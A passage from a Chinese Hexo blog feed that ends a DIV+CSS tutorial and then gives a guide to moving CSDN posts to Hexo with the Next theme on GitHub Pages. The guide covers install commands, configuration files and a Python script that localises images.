class="attr">class</span>=<span class="string">&quot;card-img&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-content&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Web性能优化<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">p</span>&gt;</span>优化网站加载速度，提升SEO排名和用户体验。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>了解更多<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>© 2023 我的网站. 保留所有权利.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>使用DIV+CSS技术构建，遵循现代Web标准。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;back-to-top&quot;</span>&gt;</span>↑<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 仅用于演示返回顶部按钮</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> backToTop = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.back-to-top&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">pageYOffset</span> &gt; <span class="number">300</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                backToTop.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;show&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                backToTop.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;show&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.back-to-top&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            e.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">top</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">behavior</span>: <span class="string">&#x27;smooth&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个综合示例展示了以下知识点：</p>
<ol>
<li><strong>DIV和CSS基础</strong>：使用DIV作为容器，CSS控制样式</li>
<li><strong>样式表类型</strong>：嵌入样式表（主要部分）和内联样式（仅用于演示）</li>
<li><strong>注释</strong>：CSS注释用于解释代码</li>
<li><strong>样式选择器</strong>：元素选择器、类选择器、ID选择器、后代选择器、伪类选择器等</li>
<li><strong>背景</strong>：背景颜色、背景图像、背景渐变、背景重复等</li>
<li><strong>边框</strong>：边框样式、宽度、颜色</li>
<li><strong>文字属性</strong>：颜色、大小、粗细、字体</li>
<li><strong>文本属性</strong>：对齐、行高、首行缩进、文本装饰</li>
<li><strong>列表</strong>：列表样式、位置、自定义图像</li>
<li><strong>超链接</strong>：四种状态的样式设置</li>
<li><strong>盒子模型</strong>：内容、内边距、边框、外边距</li>
<li><strong>margin与padding</strong>：设置元素间距</li>
<li><strong>float</strong>：创建多列布局，以及清除浮动</li>
<li><strong>块级元素与行内元素</strong>：不同元素类型的特性和转换</li>
<li><strong>溢出</strong>：处理内容溢出的情况</li>
<li><strong>定位</strong>：static、relative、absolute、fixed、sticky定位方式</li>
<li><strong>z-index</strong>：控制元素堆叠顺序</li>
</ol>
<p>这个示例还包含了响应式设计、CSS动画、Flexbox和Grid布局等现代Web技术，展示了如何将这些基础知识点应用到实际项目中。</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>Web</category>
        <category>前端&amp;后端基础</category>
      </categories>
      <tags>
        <tag>DIV</tag>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Blog-Building</title>
    <url>/2024/09/10/Blog-Building/</url>
    <content><![CDATA[<h1 id="从CSDN迁移博客到Hexo-Next-GitHub-Pages"><a href="#从CSDN迁移博客到Hexo-Next-GitHub-Pages" class="headerlink" title="从CSDN迁移博客到Hexo+Next+GitHub Pages"></a>从CSDN迁移博客到Hexo+Next+GitHub Pages</h1><p>本指南专为「从CSDN导出博客，部署到Hexo+Next主题GitHub Pages」的用户设计，全面解决：</p>
<ul>
<li>CSDN导出图片不显示问题</li>
<li>Hexo配置错误导致部署失败</li>
<li>路径解析和缓存冲突</li>
<li>GitHub Pages部署疑难杂症</li>
<li>博客结构混乱、功能缺失、体验不佳</li>
</ul>
<h1 id="一、环境准备与项目初始化"><a href="#一、环境准备与项目初始化" class="headerlink" title="一、环境准备与项目初始化"></a>一、环境准备与项目初始化</h1><p><strong>1.1 必备环境安装</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装Node.js（必需v14+，推荐v18+）</span></span><br><span class="line"><span class="comment"># 官网下载：https://nodejs.org/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装Git</span></span><br><span class="line"><span class="comment"># 官网下载：https://git-scm.com/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证安装</span></span><br><span class="line">node --version</span><br><span class="line">npm --version</span><br><span class="line">git --version</span><br></pre></td></tr></table></figure>

<p><strong>1.2 GitHub仓库准备</strong></p>
<ul>
<li>创建一个名为 <code>你的用户名.github.io</code> 的仓库（必须是此格式）。</li>
<li><strong>推荐</strong>：配置SSH密钥以实现免密推送。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;your_email@example.com&quot;</span></span><br><span class="line"><span class="comment"># 将 ~/.ssh/id_rsa.pub 内容添加到 GitHub 的 SSH Keys 设置中</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>1.3 Hexo项目初始化</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装Hexo命令行工具</span></span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建博客项目</span></span><br><span class="line">hexo init myBlog</span><br><span class="line"><span class="built_in">cd</span> myBlog</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装Next主题</span></span><br><span class="line">npm install hexo-theme-next --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装部署插件</span></span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装搜索插件（用于本地搜索）</span></span><br><span class="line">npm install hexo-generator-searchdb --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装站点地图插件（用于SEO）</span></span><br><span class="line">npm install hexo-generator-sitemap --save</span><br><span class="line">npm install hexo-generator-baidu-sitemap --save  <span class="comment"># 可选，百度专用</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="二、核心配置文件详解"><a href="#二、核心配置文件详解" class="headerlink" title="二、核心配置文件详解"></a>二、核心配置文件详解</h1><p><strong>2.1 Hexo主配置文件 (<code>_config.yml</code>)</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">ZQ-Rookie-Hacker的技术博客</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;分享编程、网络安全、工具使用技巧&#x27;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27;专注于Hexo博客搭建、前端开发、网络安全的技术分享平台&#x27;</span></span><br><span class="line"><span class="attr">keywords:</span> [<span class="string">&#x27;Hexo&#x27;</span>, <span class="string">&#x27;博客搭建&#x27;</span>, <span class="string">&#x27;网络安全&#x27;</span>, <span class="string">&#x27;SSH&#x27;</span>, <span class="string">&#x27;编程技巧&#x27;</span>]</span><br><span class="line"><span class="attr">author:</span> <span class="string">ZQ-Rookie-Hacker</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://你的用户名.github.io</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">external_link:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span></span><br><span class="line">  <span class="attr">exclude:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span>  <span class="comment"># 🔑 关键：启用文章资源文件夹（每篇文章一个文件夹存放图片）</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span>     <span class="comment"># 🔑 关键：禁用相对链接，确保路径正确</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Markdown配置（解决图片核心问题）</span></span><br><span class="line"><span class="attr">syntax_highlighter:</span> <span class="string">highlight.js</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hljs:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">marked:</span></span><br><span class="line">  <span class="attr">prepend_root:</span> <span class="literal">true</span>    <span class="comment"># 🔑 关键：自动为相对路径添加根路径</span></span><br><span class="line">  <span class="attr">post_asset:</span> <span class="literal">true</span>      <span class="comment"># 🔑 关键：识别文章资源文件夹中的图片</span></span><br><span class="line"></span><br><span class="line"><span class="attr">prismjs:</span></span><br><span class="line">  <span class="attr">preprocess:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭缓存避免路径问题</span></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:你的用户名/你的用户名.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure>

<p><strong>2.2 Next主题配置 (<code>themes/next/_config.yml</code>)</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Scheme Settings (推荐简洁大气的Gemini或Mist)</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Gemini</span></span><br><span class="line"><span class="comment"># scheme: Mist</span></span><br><span class="line"><span class="comment"># scheme: Pisces</span></span><br><span class="line"><span class="comment"># scheme: Muse</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dark Mode</span></span><br><span class="line"><span class="attr">darkmode:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Menu Settings</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-folder</span>  <span class="comment"># 新增：分类页</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span>              <span class="comment"># 新增：标签页</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span>            <span class="comment"># 可选：需先创建about页</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sidebar Settings</span></span><br><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">left</span></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Post Settings</span></span><br><span class="line"><span class="attr">excerpt_description:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">read_more_btn:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 图片懒加载（提升加载速度）</span></span><br><span class="line"><span class="attr">lazyload:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码高亮优化</span></span><br><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">  <span class="attr">copy_button:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地搜索</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">placeholder:</span> <span class="string">搜索文章...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 阅读量统计（不蒜子）</span></span><br><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">archive_views:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 评论系统（推荐Gitalk）</span></span><br><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">client_id:</span> <span class="string">你的Client</span> <span class="string">ID</span></span><br><span class="line">  <span class="attr">client_secret:</span> <span class="string">你的Client</span> <span class="string">Secret</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">blog-comments</span>  <span class="comment"># 用于存储评论的GitHub仓库名</span></span><br><span class="line">  <span class="attr">owner:</span> <span class="string">你的GitHub用户名</span></span><br><span class="line">  <span class="attr">admin:</span> [<span class="string">你的GitHub用户名</span>]</span><br><span class="line">  <span class="attr">distraction_free_mode:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SEO</span></span><br><span class="line"><span class="attr">seo:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="三、CSDN图片处理终极方案"><a href="#三、CSDN图片处理终极方案" class="headerlink" title="三、CSDN图片处理终极方案"></a>三、CSDN图片处理终极方案</h1><p><strong>3.1 自动化图片下载与修复脚本 (<code>fix_csdn_images.py</code>)</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====== 你只需要改这一行：你的文章放哪儿？ ======</span></span><br><span class="line">POSTS_DIR = <span class="string">r&quot;F:\myBlog\source\_posts&quot;</span>  <span class="comment"># 修改为你的实际路径</span></span><br><span class="line"><span class="comment"># ================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持的图片格式</span></span><br><span class="line">IMG_EXTENSIONS = (<span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>, <span class="string">&#x27;.bmp&#x27;</span>, <span class="string">&#x27;.webp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_image</span>(<span class="params">url, save_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;下载单张图片&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.get(url, headers=headers, timeout=<span class="number">15</span>)</span><br><span class="line">        res.raise_for_status()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(save_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(res.content)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 下载失败：<span class="subst">&#123;url&#125;</span>，错误：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_markdown_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;处理单个Markdown文件&quot;&quot;&quot;</span></span><br><span class="line">    article_name = os.path.splitext(os.path.basename(file_path))[<span class="number">0</span>]</span><br><span class="line">    image_dir = os.path.join(os.path.dirname(file_path), article_name)</span><br><span class="line">    os.makedirs(image_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查找所有CSDN网络图片链接</span></span><br><span class="line">    img_pattern = <span class="string">r&#x27;!\[([^\]]*)\]\((https?://[^\s)]+\.(?:png|jpg|jpeg|gif|bmp|webp))\)&#x27;</span></span><br><span class="line">    matches = <span class="built_in">list</span>(re.finditer(img_pattern, content))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;🔍 找到 <span class="subst">&#123;<span class="built_in">len</span>(matches)&#125;</span> 张图片&quot;</span>)</span><br><span class="line"></span><br><span class="line">    success_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, <span class="keyword">match</span> <span class="keyword">in</span> <span class="built_in">enumerate</span>(matches):</span><br><span class="line">        alt_text = <span class="keyword">match</span>.group(<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;图片描述&#x27;</span></span><br><span class="line">        url = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;⬇️ 正在下载 (<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(matches)&#125;</span>): <span class="subst">&#123;os.path.basename(url)&#125;</span> &quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 生成图片文件名</span></span><br><span class="line">        parsed = urlparse(url)</span><br><span class="line">        ext = os.path.splitext(parsed.path)[<span class="number">1</span>].lower()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ext <span class="keyword">or</span> ext <span class="keyword">not</span> <span class="keyword">in</span> IMG_EXTENSIONS:</span><br><span class="line">            ext = <span class="string">&#x27;.png&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 清理文件名中的特殊字符</span></span><br><span class="line">        clean_alt = re.sub(<span class="string">r&#x27;[^\w\u4e00-\u9fa5-]&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, alt_text)</span><br><span class="line">        filename_on_disk = <span class="string">f&quot;<span class="subst">&#123;clean_alt&#125;</span>_<span class="subst">&#123;i+<span class="number">1</span>&#125;</span><span class="subst">&#123;ext&#125;</span>&quot;</span> <span class="keyword">if</span> clean_alt <span class="keyword">else</span> <span class="string">f&quot;image_<span class="subst">&#123;i+<span class="number">1</span>&#125;</span><span class="subst">&#123;ext&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        local_path = os.path.join(image_dir, filename_on_disk)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> download_image(url, local_path):</span><br><span class="line">            <span class="comment"># 使用标准Markdown语法，引用本地文件</span></span><br><span class="line">            new_link = <span class="string">f&quot;![<span class="subst">&#123;alt_text&#125;</span>](<span class="subst">&#123;filename_on_disk&#125;</span>)&quot;</span></span><br><span class="line">            content = content.replace(<span class="keyword">match</span>.group(<span class="number">0</span>), new_link)</span><br><span class="line">            success_count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✅ 已保存：<span class="subst">&#123;filename_on_disk&#125;</span> &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存修改后的内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> success_count, <span class="built_in">len</span>(matches)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;🚀 开始处理CSDN导出的图片...&quot;</span>)</span><br><span class="line">    total_success = <span class="number">0</span></span><br><span class="line">    total_images = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(POSTS_DIR):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> filename.endswith(<span class="string">&#x27;.md&#x27;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        blog_path = os.path.join(POSTS_DIR, filename)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n📄 正在处理：<span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        success, total = process_markdown_file(blog_path)</span><br><span class="line">        total_success += success</span><br><span class="line">        total_images += total</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;🎉 <span class="subst">&#123;filename&#125;</span> 处理完成：<span class="subst">&#123;success&#125;</span>/<span class="subst">&#123;total&#125;</span> 张图片成功&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n🎊 全部完成！总计处理 <span class="subst">&#123;total_success&#125;</span>/<span class="subst">&#123;total_images&#125;</span> 张图片&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n📝 接下来执行：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   hexo clean &amp;&amp; hexo generate &amp;&amp; hexo server&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><strong>3.2 使用说明</strong></p>
<ol>
<li><strong>修改路径</strong>：将脚本中的 <code>POSTS_DIR</code> 修改为你博客文章的实际路径（如 <code>F:\myBlog\source\_posts</code>）。</li>
<li><strong>运行脚本</strong>：在命令行中进入脚本所在目录，执行 <code>python fix_csdn_images.py</code>。</li>
<li><strong>验证结构</strong>：脚本执行后，你的文章目录结构应变为：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source/_posts/</span><br><span class="line">├── SSH隧道技术.md</span><br><span class="line">└── SSH隧道技术/</span><br><span class="line">    ├── 图片描述_1.png</span><br><span class="line">    ├── 图片描述_2.jpg</span><br><span class="line">    └── ...</span><br></pre></td></tr></table></figure></li>
<li><strong>本地预览</strong>：执行 <code>hexo clean &amp;&amp; hexo generate &amp;&amp; hexo server</code>，在浏览器中访问 <code>http://localhost:4000</code>，确认图片已正常加载。</li>
</ol>
<hr>
<h1 id="四、核心：搭建清晰的「分类-标签」体系（解决文章归类问题）"><a href="#四、核心：搭建清晰的「分类-标签」体系（解决文章归类问题）" class="headerlink" title="四、核心：搭建清晰的「分类&#x2F;标签」体系（解决文章归类问题）"></a>四、核心：搭建清晰的「分类&#x2F;标签」体系（解决文章归类问题）</h1><p>分类是博客的“骨架”，标签是“索引”，两者结合让读者快速找到内容，也让你的博客结构更规整。</p>
<p><strong>4.1 先明确规则（避免混乱）</strong></p>
<ul>
<li><strong>分类</strong>：层级化、不重复（例如：<code>技术</code> → <code>网络安全</code>，<code>工具</code> → <code>Hexo配置</code>）。一篇文章建议1-2个主分类。</li>
<li><strong>标签</strong>：扁平化、多维度（例如：一篇「Hexo分类配置」的文章，标签可设 <code>Hexo</code>、<code>博客搭建</code>、<code>分类管理</code>）。一篇文章可多个标签。</li>
</ul>
<p><strong>4.2 步骤1：创建「分类页」「标签页」（让导航能访问）</strong><br>Hexo需要手动创建分类&#x2F;标签的“容器页面”，否则导航栏点击后会404：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建分类页面</span></span><br><span class="line">hexo new page <span class="string">&quot;categories&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建标签页面</span></span><br><span class="line">hexo new page <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后分别编辑这两个文件的 Front-matter，添加 <code>type</code> 标识：</p>
<ul>
